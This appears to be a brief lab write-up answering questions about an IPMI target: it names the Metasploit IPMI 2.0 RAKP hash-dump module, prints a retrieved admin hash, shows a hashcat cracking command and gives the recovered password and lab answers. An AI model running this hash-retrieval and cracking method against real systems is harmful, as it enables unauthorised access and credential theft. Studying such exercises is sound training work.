# Target
```
10.129.202.5
```

## Q1: What username is configured for accessing the host via IPMI?
Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
Found hash: 
```
admin:d026151682010000af5221e979981fa41114ed34ccbe0fb599a8cfeb4c129c7c73be8fffa1bdad54a123456789abcdefa123456789abcdef140561646d696e:d0c301401527b8e1d03a2d05564b0fa9d372d4fe
```
Ans: `admin`

## Q2: What is the account's clear-text password?
```sh
hashcat -a 0 -m 7300 ipmi_hash.txt rockyou-40.txt --username
```
Ans: `trinity`
